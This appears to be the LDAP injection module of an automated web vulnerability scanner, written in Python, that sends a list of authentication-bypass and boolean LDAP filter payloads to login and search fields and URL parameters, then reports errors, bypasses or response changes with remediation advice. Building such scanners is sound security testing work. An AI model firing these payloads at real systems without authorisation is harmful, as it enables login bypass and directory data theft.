"""
LDAP Injection Scanner
Detects LDAP injection vulnerabilities
"""

import asyncio
import re
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode


class LDAPIScanner:
    """Scanner for LDAP Injection vulnerabilities"""
    
    def __init__(self, config, session):
        """Initialize LDAP Injection scanner"""
        self.config = config
        self.session = session
        self.vulnerabilities = []
        
        # LDAP injection payloads
        self.ldap_payloads = [
            # Authentication bypass
            '*',
            '*)(&',
            '*)(|(&',
            '*()|&',
            'admin*',
            'admin*)((|userPassword=*',
            
            # Boolean-based
            '*)(objectClass=*',
            '*))(|(objectClass=*',
            '*)(uid=*))(|(uid=*',
            
            # Blind injection
            '*)(cn=*',
            '*)(mail=*',
            
            # Advanced bypass
            '*)(|(password=*))',
            'admin)(&(password=*',
            '*))(|(objectClass=*))(&(password=*',
        ]
        
        # Error patterns
        self.error_patterns = [
            r'LDAP',
            r'ldap',
            r'javax\.naming',
            r'LDAPException',
            r'com\.sun\.jndi\.ldap',
            r'invalid filter',
            r'bad search filter',
        ]
        
        # Success indicators
        self.success_indicators = [
            'login successful',
            'welcome',
            'authenticated',
            'dashboard',
        ]
        
    async def scan(self, target: str, recon_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Scan for LDAP Injection vulnerabilities
        """
        self.vulnerabilities = []
        
        print(f"[*] LDAP Injection Scanner: Testing {target}")
        
        # Test forms (especially login/search forms)
        if recon_data.get('forms'):
            for form in recon_data['forms']:
                await self._scan_form(target, form)
        
        # Test URL parameters
        parsed = urlparse(target)
        if parsed.query:
            await self._scan_url_params(target)
        
        return self.vulnerabilities
    
    async def _scan_form(self, target: str, form: Dict[str, Any]):
        """Test form for LDAP injection"""
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        inputs = form.get('inputs', [])
        
        # Build form URL
        if action:
            form_url = urljoin(target, action)
        else:
            form_url = target
        
        # Look for LDAP-related fields
        ldap_fields = ['username', 'user', 'uid', 'cn', 'dn', 'mail', 'email', 
                      'login', 'search', 'query', 'filter']
        
        for input_field in inputs:
            input_name = input_field.get('name', '')
            
            if not input_name:
                continue
            
            # Check if it's an LDAP-related field
            if any(lf in input_name.lower() for lf in ldap_fields):
                await self._test_ldap_injection_form(form_url, method, input_name, inputs)
    
    async def _scan_url_params(self, url: str):
        """Test URL parameters for LDAP injection"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name in params.keys():
            await self._test_ldap_injection_url(url, param_name)
    
    async def _test_ldap_injection_form(self, url: str, method: str, param: str,
                                       all_inputs: List[Dict]):
        """Test form for LDAP injection"""
        
        # Build base data
        data = {}
        for inp in all_inputs:
            name = inp.get('name', '')
            if name:
                data[name] = inp.get('value', 'test')
        
        # Get baseline response
        baseline_response = await self._get_response(url, method, data)
        if not baseline_response:
            return
        
        baseline_content, baseline_status = baseline_response
        
        # Test LDAP injection payloads
        for payload in self.ldap_payloads:
            test_data = data.copy()
            test_data[param] = payload
            
            test_response = await self._get_response(url, method, test_data)
            if not test_response:
                continue
            
            test_content, test_status = test_response
            
            # Check for LDAP errors
            for error_pattern in self.error_patterns:
                if re.search(error_pattern, test_content, re.IGNORECASE):
                    self.vulnerabilities.append({
                        'type': 'ldapi',
                        'severity': 'high',
                        'url': url,
                        'parameter': param,
                        'method': method,
                        'payload': payload,
                        'evidence': f'LDAP error pattern detected: {error_pattern}',
                        'description': 'LDAP Injection vulnerability - Error-based',
                        'remediation': 'Use parameterized LDAP queries. Validate and escape special LDAP characters.',
                        'cwe': 'CWE-90',
                        'owasp': 'A03:2021 - Injection',
                    })
                    return
            
            # Check for authentication bypass
            if await self._is_ldap_bypass(baseline_content, baseline_status,
                                         test_content, test_status):
                self.vulnerabilities.append({
                    'type': 'ldapi',
                    'severity': 'critical',
                    'url': url,
                    'parameter': param,
                    'method': method,
                    'payload': payload,
                    'evidence': 'Authentication bypass detected',
                    'description': 'LDAP Injection vulnerability - Authentication bypass',
                    'remediation': 'Use parameterized LDAP queries. Implement proper authentication controls.',
                    'cwe': 'CWE-90',
                    'owasp': 'A03:2021 - Injection',
                })
                return
            
            # Check for blind injection (content changes)
            if self._detect_blind_ldapi(baseline_content, test_content):
                self.vulnerabilities.append({
                    'type': 'ldapi',
                    'severity': 'medium',
                    'url': url,
                    'parameter': param,
                    'method': method,
                    'payload': payload,
                    'evidence': 'Response differs based on LDAP filter',
                    'description': 'Possible LDAP Injection vulnerability - Blind',
                    'remediation': 'Use parameterized LDAP queries. Validate and escape special LDAP characters.',
                    'cwe': 'CWE-90',
                    'owasp': 'A03:2021 - Injection',
                })
                return
    
    async def _test_ldap_injection_url(self, url: str, param: str):
        """Test URL parameter for LDAP injection"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Get baseline
        baseline_response = await self._get_response(url, 'GET')
        if not baseline_response:
            return
        
        baseline_content, baseline_status = baseline_response
        
        # Test LDAP payloads
        for payload in self.ldap_payloads[:10]:  # Limit for URL params
            test_params = params.copy()
            test_params[param] = [payload]
            
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            test_response = await self._get_response(test_url, 'GET')
            if not test_response:
                continue
            
            test_content, test_status = test_response
            
            # Check for errors
            for error_pattern in self.error_patterns:
                if re.search(error_pattern, test_content, re.IGNORECASE):
                    self.vulnerabilities.append({
                        'type': 'ldapi',
                        'severity': 'high',
                        'url': url,
                        'parameter': param,
                        'method': 'GET',
                        'payload': payload,
                        'evidence': f'LDAP error pattern: {error_pattern}',
                        'description': 'LDAP Injection vulnerability in URL parameter',
                        'remediation': 'Use parameterized LDAP queries. Escape special characters.',
                        'cwe': 'CWE-90',
                        'owasp': 'A03:2021 - Injection',
                    })
                    return
    
    async def _is_ldap_bypass(self, baseline_content: str, baseline_status: int,
                             test_content: str, test_status: int) -> bool:
        """Check for LDAP authentication bypass"""
        
        # Authentication bypass: baseline denied, test allowed
        if baseline_status in [401, 403] and test_status == 200:
            return True
        
        # Success indicators appear
        if test_status == 200:
            for indicator in self.success_indicators:
                if indicator in test_content.lower() and indicator not in baseline_content.lower():
                    return True
        
        return False
    
    def _detect_blind_ldapi(self, baseline: str, test: str) -> bool:
        """Detect blind LDAP injection"""
        
        # If response length differs significantly
        if abs(len(test) - len(baseline)) > 100:
            return True
        
        # If status changes
        return False
    
    async def _get_response(self, url: str, method: str = 'GET', 
                           data: Dict = None) -> tuple:
        """Get HTTP response"""
        try:
            if method == 'POST':
                async with self.session.post(url, data=data, timeout=10) as response:
                    content = await response.text()
                    return content, response.status
            else:
                if data:
                    async with self.session.get(url, params=data, timeout=10) as response:
                        content = await response.text()
                        return content, response.status
                else:
                    async with self.session.get(url, timeout=10) as response:
                        content = await response.text()
                        return content, response.status
        
        except Exception:
            return None
